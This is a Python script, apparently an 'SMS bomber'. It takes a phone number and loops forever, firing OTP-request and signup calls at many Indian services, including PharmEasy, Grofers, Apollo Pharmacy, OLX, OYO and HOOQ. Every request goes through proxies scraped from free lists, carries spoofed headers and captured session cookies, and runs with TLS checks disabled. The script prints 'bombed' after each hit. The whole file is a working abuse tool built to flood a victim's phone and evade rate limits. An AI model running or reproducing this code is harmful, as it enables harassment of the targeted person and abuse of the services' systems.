import requests
import ssl
import mechanize
from multiprocessing import Process
num=raw_input("enter no.:")
con='{"country_code":+91"'+'","phone_number":"'+num+'"}'
h={"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36","Accept":"*/*","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate, br","Referer":"https://pharmeasy.in/","Content-Type":"application/json","Content-Length":"30","Connection":"keep-alive"}
d ='{"contactNumber":"'+num+'"}'
u="https://pharmeasy.in/api/auth/requestOTP"
h1={"content-length":"21","lon":"77.040489","origin":"https://grofers.com","auth_key":"458a454d5ae18c3022b3a9b30cd562833e6557bccd808424e3e5c721a9953821","content-type":"application/x-www-form-urlencoded","app_client":"consumer_web","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36","lat":"28.4465616","save-data":"on","accept":"*/*","referer":"https://grofers.com/","accept-encoding":"gzip, deflate, br","accept-language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6","cookie":"WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A2%2C%22s%22%3A1559938916%2C%22t%22%3A1559939431%7D","cookie":"_sp_id.bf41=0f1a9fa739dec41e.1559938914.1.1559939420.1559938914.f31b863c-e72e-4a42-817b-9fbcc5d15659","cookie":"__insp_slim=1559939406617","cookie":"__insp_norec_sess=true","cookie":"_fbp=fb.1.1559938919114.1346857015","cookie":"__insp_targlpt=QnV5IFZlZ2V0YWJsZXMgT25saW5l","cookie":"__insp_targlpu=aHR0cHM6Ly9ncm9mZXJzLmNvbS9jbi9ncm9jZXJ5LXN0YXBsZXMvcG90YXRvLW9uaW9uLXRvbWF0by9jaWQvMTYvMTQ5MA%3D%3D","cookie":"__insp_nv=true","cookie":"__insp_wid=180455199","cookie":"gr_1_featureFlags=%7B%22ia%22%3Afalse%2C%22pdp%22%3Afalse%2C%22edlpWithBanner%22%3Atrue%7D","cookie":"gr_1_sessionKey=e1841adf-ce33-455c-94f6-06fbb6eecdc6","cookie":"AMP_TOKEN=%24NOT_FOUND","cookie":"_sp_ses.bf41=*","cookie":"WZRK_G=58d7893bca824e419eeb6671049b731b","cookie":"_gid=GA1.2.1524131663.1559938913","cookie":"_ga=GA1.2.1526509191.1559938913","cookie":"gr_1_locality=1849","cookie":"gr_1_lon=77.04061469999999","cookie":"gr_1_lat=28.4472372","cookie":"__cfduid=dc9feb5f041064b558fe7bc347c8737fa1559938905"}
d1='user_phone='+num
u1="https://grofers.com/v2/accounts/"
h2={"content-length":"17","accept":"*/*","origin":"https://www.apollopharmacy.in","x-requested-with":"XMLHttpRequest","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36","content-type":"application/x-www-form-urlencoded; charset=UTF-8","referer":"https://www.apollopharmacy.in/sociallogin/mobile/login/","accept-encoding":"gzip, deflate, br","accept-language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6","cookie":"__cfduid=d64c65a2edad54086382759cdf599de901558686615","cookie":"_ga=GA1.2.1278908803.1558686621","cookie":"__ta_device=fAz8eA9Rx40yyIiB5mzvHt4apFaSkMBA","cookie":"_fbp=fb.1.1558686627127.655454618","cookie":"__stat=BLOCK","cookie":"jv_visits_count_EXRKNIzFkV=1","cookie":"__stp={visit:returning,uuid:d9a1c39d-efbd-4911-ac0e-6333455f9fbb}","cookie":"PHPSESSID=vnj2hvk8nga4v1m2hvlmvl88r4","cookie":"_gid=GA1.2.132668726.1560239715","cookie":"_gat=1","cookie":"__ta_visit=f5uvpYKu8EVmJAJmFGXMmXGSTiNQSWRS","cookie":"_gat_UA-31142855-1=1","cookie":"__ta_ping=1","cookie":"mage-cache-storage=%7B%7D","cookie":"mage-cache-storage-section-invalidation=%7B%7D","cookie":"mage-cache-sessid=true","cookie":"mage-messages=","cookie":"private_content_version=46e6c8611a9b0d06e662da50ca5cf311","cookie":"AWSALB=2177QHjXXrFgaem1w0FrBqZ2aoKrMhI+DibolJaee9cVOP4ZSV2LiLC3tks68ud4ERCydxa8kb4klbiI+VEnNQB0rsyins1USgvHcPOUoz2nySN3SC5G/wpAACIq","cookie":"section_data_ids=%7B%22cart%22%3A1560239751%7D"}
d2='mobile='+num
u2="https://www.apollopharmacy.in/sociallogin/mobile/sendotp/"
h3={"Connection":"keep-alive","Content-Length":"23","Accept":"*/*","Origin":"https://www.capitalfirst.com","X-Requested-With":"XMLHttpRequest","Save-Data":"on","User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Referer":"https://www.capitalfirst.com/personal-loan-verify-mobile","Accept-Encoding":"gzip, deflate, br","Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6","Cookie":"_ga=GA1.2.1398048285.1560652764; _gid=GA1.2.1096483080.1560652764; _fbp=fb.1.1560652766930.1354503182; BNES_ci_session=OZ4SQ5w7lWfaCnCQw/067sA6wNcenr8K1Ch1eNCluslGPPzLpASxU8OwhfIMMcYSWRZmopMRcOUGfvgCIxkhQVVvhXcUTbk6; _gat_UA-36221369-1=1"}
d3='mobileNumber='+num+''
u3="https://www.capitalfirst.com/Personalloan/generateOTP"
h4={"content-length":"44","accept":"*/*","x-newrelic-id":"VQMGU1ZVDxABU1lbBgMDUlI=","origin":"https://www.olx.in","user-agent":"Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36","content-type":"application/json","referer":"https://www.olx.in/","accept-encoding":"gzip, deflate, br","accept-language":"en-US,en;q=0.9","cookie":"onap=16b1b8f48d4x746d47ab-1-16b1b8f48d4x746d47ab-19-1559537345","cookie":"bm_sv=CDB97F50DA6615AC420F3E6E77B04E42~OoX2fAuP7ggcNa0VjzE95FzJNKRdJlW09Hja0/cysIGF1sJoBO7i0ndGXqnTWLaunlyxktHLbE8BSstPCRYn8VdP15lvUxK3ZY9ahXOSgwAidxwXd1jCe5wjIzYbiXp5eKNWfFpowhFbpxloe+SrbiE0YHJVPcCV5bmdsHgPfQc=","cookie":"AMP_TOKEN=%24NOT_FOUND","cookie":"hint=true","cookie":"_gid=GA1.2.369819276.1559535517","cookie":"_ga=GA1.2.665688753.1559535517","cookie":"ldTd=true","cookie":"G_ENABLED_IDPS=google","cookie":"HIDE_ONBOARDING_LOCATION=true","cookie":"testCookie=testCookie","cookie":"ak_bmsc=307C5311FB00A3F4E856AFFE1A9D000B0214BED9E0210000909FF45C1E802067~plFZfbMQGgEDr7OWVe9FvqfT24ZtOVMamtYcaip71IYOrv2+SQ6fokSvMk2Uesz5v1sFfaichbtDgeVSj3te3vXJKezSWgvoVWrK7gfzFrLz1ruBm0MQj01V5CmpaTr6tRgDRSN6bks3nqvOHzR0tA1IoqfDfq2MKtmDjbknCI5FlLYUTwqlnwHowYArfybn2n3yilE6VKHjW+tH8kqjAfH8BGuijpmO9numkgmIyOeaZIVM3k6FGOL3Wj3jLI8uGaU","cookie":"_abck=153BD3D333948A58932748CAC3D4C3F40214BED9E0210000909FF45C18838E05~0~8O+udxdG38sBFTPZpaBL4IGj7eUcKJ1VwAtJ52GMO5E=~-1~-1","cookie":"bm_sz=BD665D919F7C6FA8374F196445596436~YAAQ2b4UArpOAwtrAQAAq0qPGwNksHBgphLwDzwfBlwIRQJAG7txmjBo/of7NiAJ93gy/7vBhQ9l5sIKdwtl2j+U4bys2Hhh5tZlZL/jqdnW/JrgmgawcxiunAJ32BbY9UtnFIrNxbbRvzQCYnSwf/cz9a7jURsui7leuLaVm7mQEcHPOtC6g5jrToAMTbdA","cookie":"97c09e2aabdfed89b87a3010d7f13c64=353b4f9fd82d26268ad11b2c1e9ae019","cookie":"lqstatus=1559536704","cookie":"laquesis=pan-26381@a#pan-27752@b#pan-30043@b#pana-26381@b"}
d4='{"type":"call","descriptor":"+91'+num+'"}'
u4="https://www.olx.in/api/challenges"
h5={"Connection":"keep-alive","Content-Length":"126","Accept":"*/*","Origin":"https://www.heromotocorp.com","X-Requested-With":"XMLHttpRequest","Save-Data":"on","User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Referer":"https://www.heromotocorp.com/en-in/xpulse200/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6","Cookie":"HttpOnly; _ga=GA1.2.1273460610.1561191565; _gid=GA1.2.172574299.1561191565; _gcl_au=1.1.833556660.1561191566; _fbp=fb.1.1561191568709.1707722126; PHPSESSID=m5tap7nr75b2ehcn8ur261oq86"}
d5='mobile_no='+num+'&randome=ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=&mobile_no_otp=&csrf=523bc3fa1857c4df95e4d24bbd36c61b'
u5="https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php"
u6="https://pharmeasy.in/api/auth/requestOTP"
h6=None
d6={"contactNumber":num}
url=["https://www.oyorooms.com/api/pwa/generateotp?phone=","https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo="]
d={u1:[h1,d1],u2:[h2,d2],u3:[h3,d3],u4:[h4,d4],u5:[h5,d5],u6:[h6,d6],"GET":url}
ssl._create_default_https_context = ssl._create_unverified_context 
br = mechanize.Browser()	
br.set_handle_equiv(True)	
br.set_handle_gzip(True)
br.set_handle_redirect(True)	
br.set_handle_referer(True)	
br.set_handle_robots(False)	
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)	
br.addheaders = [("User-Agent","Mozilla/8.0 (Linux; U; Android 8.1)")]
def send1(p,c):
 br.set_proxies(p)
 br.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https":"//m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7')		
 br.select_form(nr=0)		
 br.form["mobile"] = num 
 br.form["password"] = "HaidjasduagidgIs"		
 res=br.submit().read()
 print "bombed",c
def send(num,url,x,p,c):
    if x=="GET":
       try:
        a=requests.get(url+num,proxies=p)
        print"bombed",c
       except:
           pass
       
    else:
      try:
        a=requests.post(url,headers=x[0],data=x[1],proxies=p)
        print"bombed",c
      except:
          pass
def n():
  from bs4 import BeautifulSoup
  import random
  l=random.choice(["https://free-proxy-list.net/anonymous-proxy.html","https://www.sslproxies.org/"])
  a=requests.get(l)
  s=BeautifulSoup(a.content,'html5lib')
  try:
      k={"https":random.choice(list(map(lambda x:x[0]+':'+x[1],list(zip(map(lambda x:x.text,s.findAll('td')[::8]),(map(lambda x:x.text,s.findAll('td')[1::8])))))))}
      h=requests.get("https://youtube.com",proxies=k)
      return k
  except:
      pass
c=0
while True:
 p21=n()
 p = Process(target=send1,args=(p21,c,))
 p.start()
 p.join()
 c+=1
 for x in d:
   if x=="GET":
     for x1 in d[x]:
        p = Process(target=send, args=(num,x1,x,p21,c,))
        p.start()
        p.join()
        c+=1
   else:
       p = Process(target=send, args=(num,x,d[x],p21,c,))
       p.start()
       p.join()
       c+=1












